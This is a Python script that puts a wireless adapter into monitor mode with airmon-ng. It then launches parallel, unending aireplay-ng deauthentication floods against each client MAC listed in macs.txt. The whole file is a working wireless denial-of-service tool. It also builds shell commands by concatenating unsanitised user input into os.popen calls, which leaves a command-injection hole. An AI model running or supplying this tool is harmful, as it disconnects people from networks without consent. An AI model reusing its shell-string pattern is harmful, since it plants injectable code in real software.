import sys 
import re 
import os
from time import sleep
import multiprocessing 


Wifi_mac = '00:00:00:00:00:00'

wifi_adapter = str(input("Please Enter The Wifi Adapter You Want Yo Use ==> "))

if wifi_adapter[-3:] == 'mon':
	wifi_adapter = wifi_adapter.replace(wifi_adapter, wifi_adapter[:-3])


def checkmode(wifi_adapter):
	try:
		command_result  = os.popen('sudo iwconfig '+ wifi_adapter).read()
		pattren = re.compile(r'\s*Mode:(.*?)\s')
		result = re.findall(pattren, command_result)
		Mode =  result[0]
		return Mode
	except IndexError:
		command_result  = os.popen('sudo iwconfig '+ wifi_adapter + 'mon' ).read()
		pattren = re.compile(r'\s*Mode:(.*?)\s')
		result = re.findall(pattren, command_result)
		Mode =  result[0]
		return Mode

def enable_moniter_mode(wifi_adapter):
	commnad = os.popen('sudo airmon-ng start '+ wifi_adapter)
	commnad.read()
	os.system('clear')
	print('Moniter Mode Enabled')

def check_moniter(wifi_adapter):
	if checkmode(wifi_adapter) == 'Managed':
		enable_moniter_mode(wifi_adapter)
		command = 'airodump-ng '+ wifi_adapter+' -c 5'
		return True

	else:
		print('Already In Moniter Mode:')
		command = 'airodump-ng '+ wifi_adapter+' -c 5'
		return True

def disable_moniter(wifi_adapter):
	wifi_adapter = wifi_adapter + 'mon'
	command = os.popen('sudo airmon-ng stop '+ wifi_adapter)
	command.read()
	print('Disabled Moniter MOde')

def load_macs():
	mac_address_list = []
	with open('macs.txt', 'r') as macs:
		for line in macs.readlines():
			line = line.strip()
			mac_address_list.append(line)
		return mac_address_list

def de_auth(wifi_adapter,mac, packets, wifi_mac):
		command = os.popen('aireplay-ng -0 '+ str(packets)+' -a ' + str(wifi_mac) + ' -c '+ str(mac) +' ' + str(moniter_adapter))
		print(command.read())

moniter_adapter = wifi_adapter+'mon'

if check_moniter(wifi_adapter):
	for mac in load_macs():
		multiprocessing.Process(target=de_auth,args=(moniter_adapter,mac,0,Wifi_mac)).start()
